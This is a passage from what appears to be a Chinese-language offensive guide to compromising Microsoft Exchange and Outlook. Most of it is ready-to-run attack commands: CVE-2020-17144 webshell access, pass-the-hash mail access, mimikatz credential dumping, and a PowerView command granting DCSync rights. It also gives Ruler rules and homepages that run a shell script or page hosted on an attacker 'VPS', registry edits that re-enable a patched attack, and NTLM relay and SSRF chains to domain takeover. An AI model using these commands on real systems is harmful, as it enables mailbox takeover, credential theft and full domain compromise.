        exit
          exit program
他的检测逻辑是在返回的头部加个信息
    Headers["X-ZCG-TEST"]=="CVE-2020-0688"
不排除某些网络设备会检测这个,可根据需求自行修改
另外有个需要注意的点,如果在域内,``填邮箱域名(mail.xxx.com)检测不出来,可以先通过LDAP查询每台Exchange服务器,然后一台台试试,说不定有收获.
另外一个需要注意的点,执行命令的时候最好带上`cmd /c`
###  CVE-2020-17144
需要普通用户凭据的情况下的RCE,就Exchange2010能用
    CVE-2020-17144   
执行完之后会有个内存马,访问
http://[target]/ews/soap/?pass=命令
头像哥的这个工具有个地方需要注意的是,他默认监听的是80端口的,咱们访问EWS接口一般用443,就以为没打成功,实际成功了.
## 0x05 hash/密码 操作ews接口
可以使用现成工具
###  1\. pth_to_ews
保存在目录下的inbox文件夹中为eml格式
    pth_to_ews.exe https://MAIL/ews/exchange.asmx  -U daiker -P 密码  -MType Inbox
发送邮件
    pth_to_ews.exe https://MAIL/ews/exchange.asmx -U daiker -P 密码 -Sendmail -T "123" -TM PI:EMAIL -B HTML.txt
搜索邮件内容含有ACL的邮件
    pth_to_ews.exe https://MAIL/ews/exchange.asmx  -U daiker -P 密码 -MType SentItems -Filterstring "ACL" 搜索ACL
如果有自己研发的需求,见3好学生的Exchange Web Service(EWS)开发指南
## 0x06 Exchange 在域内的位置
###  1\. 域内定位Exchange服务器
在域内可以使用ldap定位,过滤规则
    "(objectCategory=msExchExchangeServer)"
可以通过spn 来定位
    setspn -Q IMAP/*
###  2\. Exchange内部的域管凭据
拿到Exchange服务器,有很大概率就是域管直接登录的.或者域管曾经登录过.拿到Exchange服务器权限的时候,可以尝试直接dir下域控的C盘,看有没有权限.如果没有权限,再尝试使用mimikatz抓一波密码，很大概率可以直接抓到域管或者高权限用户.而且就算是高版本的server,在Exchange上也能抓到明文密码.
###  3\. Exchange的ACL
所有的Exchange Server 都在`Exchange Windows
Permissions`组里面,而这个组默认就对域有WriteACL权限,那么当我们拿下Exchange服务器的时候,就可以尝试使用WriteACL赋予自身Dcsync的权限.
使用powerview，为当前exchange机器名用户增加dcsync权限(此处需要使用dev分枝中的powerview)
    powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity ’DC=test,DC=local‘ -PrincipalIdentity exchange2016$ -Rights DCSync -Verbose}"
由于这个权限,Exchange 的RCE常用以在内网渗透中用来提升到域管权限.
因此在CVE-2019-1040中,除了可以攻击DC,也有人选择攻击Exchange.
## 0x07 攻击 OutLook客户端
前提条件:
  1. 需要用户凭据
  2. 该用户电脑装了Oulook客户端,用outlook查看邮件的时候触发.
攻击效果
通过Outlook客户端控制用户电脑
有三种方式 Form,ruler,HomePage.
###  1\. Form
[Ruler](https://github.com/sensepost/ruler)
    form
    ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email PI:EMAIL -u daiker -p 密码 --verbose --debug form display
    ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email PI:EMAIL -u daiker -p 密码 --verbose --debug form add --suffix superduper --input C:\Users\tom\Desktop\output\command.txt --rule --send
    command.txt 里面的内容是
        CreateObject("Wscript.Shell").Run "calc.exe", 0, False
    触发 
    ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email PI:EMAIL -u daiker -p 密码 --verbose --debug  form send --target PI:EMAIL --suffix superduper --subject "Hi Koos" --body "Hi Koos,\nJust checking in."
    删除
    ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email PI:EMAIL -u daiker -p 密码 --verbose --debug  form  delete --suffix superduper
KB4011091 于 2017年9月的更新中修复
### 2\. Ruler
查看规则
    ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email PI:EMAIL -u daiker -p 密码 —verbose —debug display
增加规则
    ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email PI:EMAIL -u daiker -p 密码 —verbose —debug add —location “\\VPS\webdav\shell.bat” —trigger “popashell” —name maliciousrule
触发规则
    ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email PI:EMAIL -u daiker -p 密码 —verbose —debug send —subject popashell —body “this is a test by daiker”
删除规则
    ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email PI:EMAIL -u daiker -p 密码 —verbose —debug delete —id 020000006cfcd8d7
webdav可以这样开
    pip install WsgiDAV cheroot
    wsgidav —host 0.0.0.0 —port 80 —root=/tmp/11/
没有CVE编号,但是有些版本Outlook没测试成功,可以看下这篇文章[Outlook 2016 rules start application
option gone](https://answers.microsoft.com/en-us/msoffice/forum/msoffice_outlook-mso_win10-mso_o365b/outlook-2016-rules-start-application-option-gone/1eb0066d-d50f-4948-824e-adee58ca5a6f)
### 3\. HomePage
1.[Ruler](https://github.com/sensepost/ruler)
    ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email PI:EMAIL -u daiker -p 密码 —verbose —debug homepage display
    ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email PI:EMAIL -u daiker -p 密码 —verbose —debug homepage add —url http://x
    ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email PI:EMAIL -u daiker -p 密码 —verbose —debug homepage delete
2.[pth_to_ews.exe](https://github.com/pentest-tools-public/Pass-to-hash-EWS)
    pth_to_ews.exe https://MAIL/ews/exchange.asmx -U daiker -P 密码 -Purl http://VPS:9090/aa.html -Type Set
HomePage 的内容是
    Outlook
这个是弹计算器的 自行修改,
在2017 年 11 月安全更新修复,CVE-2017-11774
修复后 Homepage 默认关闭，重新启用：
    [HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security] "EnableRoamingFolderHomepages"=dword:00000001
    [HKEY_CURRENT_USER\Software\Policies\Microsoft\Office\16.0\Outlook\Security] DWORD: NonDefaultStoreScript Value Data: 1 (Hexadecimal) to enable.
## 0x08 NTLM_Relay
在之前的系列文章里面曾经说过ntlm_relay,ntlm_relay在Exchange上的应用也很广泛.
主要有以下几种攻击场景
###  1\. 普通用户relay 到ews接口
由于EWS接口也支持NTLM
SSP的。我们可以relay到EWS接口，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网.
而outlook有个设计缺陷(具体版本稍不清楚),又可以导致我们给鱼儿发一封邮箱,对方只需查看邮件,无需预览,就可以拿到鱼儿的ntlm请求.
我们给鱼儿发一封邮件,使用HTML,在里面插入以下语句
这里支持两种协议,这里说下两个的区别
  1. UNCUNC默认携带凭据,但是如果IP 是公网IP的话,很多公司是访问不到公网445的
  2. HTTP协议默认不携带凭据,只有信任域(域内DNS记录)才会携带凭据.域内的成员默认有增加DNS的权限,可以用域内成员的权限在内网增加一条DNS记录.
给鱼儿发送邮箱
当鱼儿用outlook打开的时候就会触发请求,我们再将请求relay到EWS接口
relay到EWS接口查看邮件
relay到EWS接口通过HomePage控制Outlook客户端
###  2\. Exchange中的SSRF
在常规渗透中,SSRF常用以对内网的应用进行嗅探,配合内网某些未授权访问的应用来扩大攻击面.由于Exchange的SSRF默认携带凭据,在Relay的场景中,攻击利用面被不断放大,网上公开的一个SSRF就是CVE-2018-8581.
主要有两种应用,relay到EWS接口,relay到LDAP
(1) relay到EWS接口
由于Exchange 是以System用户的权限运行,因此我们拿到的是机器用户的Net-Ntlm Hash。并不能直接用以登录。但是Exchange
机器用户可以获得TokenSerializationRight的”特权”会话，可以Relay 到
机子本身的Ews接口，然后可以使用SOAP请求头来冒充任何用户。
具体利用请见Wyatu师傅的
(2) relay到LDAP
所有的Exchange Server 都在`Exchange Windows
Permissions`组里面,而这个组默认就对域有WriteACL权限.因此我们可以relay到LDAP,而又由于Relay到的服务端是Ldap,Ldap服务器的默认策略是协商签名。而不是强制签名。是否签名由客户端决定。在SSRF里面发起的请求是http协议，http协议是不要求进行签名.
这里面
攻击者:172.16.228.1
Exchange:172.16.228.133
域控:172.16.228.135
  * 使用impacket监听端口等待连接
  * 发起推送订阅指定所需的URL，Exchange. 服务器将尝试向这个URL发送通知
  * Relay 到域控的Ldap 服务器并给普通用户daiker添加两条acl
  * daiker进行Dcync
## 0x09 引用
  * [渗透技巧——获得Exchange GlobalAddressList的方法](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Exchange-GlobalAddressList%E7%9A%84%E6%96%B9%E6%B3%95/)
  * Owa-Outlook备忘录